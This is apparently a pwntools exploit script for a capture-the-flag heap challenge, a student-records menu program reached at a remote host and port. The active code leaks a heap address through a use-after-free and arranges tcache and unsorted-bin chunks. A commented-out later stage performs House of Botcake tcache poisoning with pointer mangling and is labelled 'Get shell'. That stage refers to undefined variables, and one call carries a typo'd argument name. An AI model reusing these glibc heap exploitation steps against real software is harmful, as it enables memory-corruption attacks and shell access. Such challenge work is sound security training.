#!/usr/bin/env python3

from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

if args.REMOTE:
    r = remote("box.acmcyber.com", 31147)
    # r = remote("localhost", 5000)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript='''
        ''')


def fill_sinfo(name: bytes, major: bytes, attr: int, aux=None):
    sna(b'name: ', name)
    sna(b'major: ', major)
    sla(b'= 1): ', sen(attr))
    if aux:
        sla(b'(y/n)?', b'y')
        sna(b'data: ', aux)
    else: sla(b'(y/n)?', b'n')

def add_student(uid: int, add_sinfo: bool, name=None, major=None, attr=None, aux=None):
    sla(b'> ', sen(1))
    sla(b'UID: ', sen(uid))
    if add_sinfo: 
        sla(b'later: ', b'y')
        fill_sinfo(name, major, attr, aux=aux)
    else: sla(b'later: ', b'n')

def update_sinfo(uid: int, name=None, major=None, attr=None, aux=None):
    sla(b'> ', sen(2))
    sla(b'UID: ', sen(uid))
    fill_sinfo(name, major, attr, aux=aux)

def get_sinfo(uid: int):
    sla(b'> ', sen(3))
    sla(b'UID: ', sen(uid))

def remove_student(uid: int):
    sla(b'> ', sen(4))
    sla(b'UID: ', sen(uid))

def main():

    # Heap leak
    add_student(100, True, name=b"bruh", major=b'bruh2', attr=123)
    remove_student(100)
    add_student(100, False)
    get_sinfo(100)
    rcu(b'Student Name: ')
    heap_base = u64(rcl().strip().ljust(8, b'\x00')) * 0x1000
    log.info(f"{hex(heap_base)=}")

    # Setup contiguous chunks of size 0x110 which will go into the tcache
    for i in range(7): 
        add_student(100+i, True, namce=b'bruh', major=b'bruh2', attr=123)
    add_student(123, True, name=b'bruh', major='bruh2', attr=123)
    add_student(124, True, name=b'bruh', major='bruh2', attr=123)
    for i in range(7): 
        update_sinfo(100+i, name=b'bruh', major=b'bruh2', attr=123)
    update_sinfo(123, name=b'bruh', major='bruh2', attr=123) # prev chunk
    update_sinfo(124, name=b'bruh', major='bruh2', attr=123) # Victim chunk
    add_student(125, False) # Barrier chunk

    # Forge fake sinfo that will point to our victim chunk as well (can't use the same one to free else glibc will abort due to double-freeing the sinfo)
    update_sinfo(125, name=b'A' * 0x100, major=b'B' * 0x40, attr=123)

    # Fill the tcache and get the 0x110 and 0x110 chunks to consolidate in the unsorted bin into a 0x220 chunk
    for i in range(7):
        remove_student(100+i)
    remove_student(123)
    remove_student(124)
    remove_student(125)

    # # House of Botcake
    # for i in range(7): 
    #     if i != 0: 
    #         add_student(100+i, False)
    #     else: 
    #         add_student(100+i, True, name=b'bruh', major='bruh2', attr=123) # Pull a chunk out of the 0x110 size tcache
    # add_student(123, False)
    # add_student(124, True, name=b'bruh', major='bruh2', attr=123) # Pull another chunk out of the 0x110 size tcache
    # add_student(125, False)
    # remove_student(123) # Put the half-chunk within the consolidated 0x220 unsorted bin chunk in tcache
    # remove_student(100) # Put another 0x110 chunk in the tcache that will be pulled out of the tcache first

    # # Overwrite next ptr of that tcache chunk
    # add_student(126, False)
    # add_student(127, False)
    # add_student(128, False)
    # add_student(129, True, name='doesn\'t matter', major='bruh2', attr=123, aux=b'A'*0x68 + p64(0x111) + p64(mangle(write_addr, heap_leak+0x1000)))
    # add_student(130, True, name='doesn\'t matter', major='bruh2', attr=123)
    # add_student(130, True, name=p64(0xf1eeee2df1eeee2d), major='bruh2', attr=123)

    # # Get shell
    # sla(b'> ', sen(5))

    r.interactive()


if __name__ == "__main__":
    main()
